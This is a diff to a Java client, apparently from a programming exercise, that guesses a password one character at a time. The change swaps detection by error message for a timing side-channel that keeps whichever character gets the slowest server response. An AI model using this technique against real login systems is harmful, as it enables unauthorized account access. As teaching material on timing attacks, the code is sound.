@@ -47,23 +47,28 @@ public class Main {
             }
 
             while (!isDone) {
+                char nextSymbol = 'a';
+                long maxTime = Long.MIN_VALUE;
                 for (int i = 0; i < abc.length(); i++) {
                     String password = truePassword + abc.charAt(i);
                     Request request = new Request(trueLogin, password);
                     String jsonRequest = gson.toJson(request);
+                    long start = System.nanoTime();
                     output.writeUTF(jsonRequest);
                     String receivedMsg = input.readUTF();
+                    long stop = System.nanoTime();
                     Response response = gson.fromJson(receivedMsg, Response.class);
                     if (Objects.equals(response.result, "Connection success!")) {
                         System.out.println(jsonRequest);
                         isDone = true;
                         break;
                     }
-                    if (Objects.equals(response.result, "Exception happened during login")) {
-                        truePassword = password;
-                        break;
+                    if (stop - start > maxTime) {
+                        nextSymbol = abc.charAt(i);
+                        maxTime = stop - start;
                     }
                 }
+                truePassword = truePassword + nextSymbol;
             }
 
         } catch (IOException ignored) {
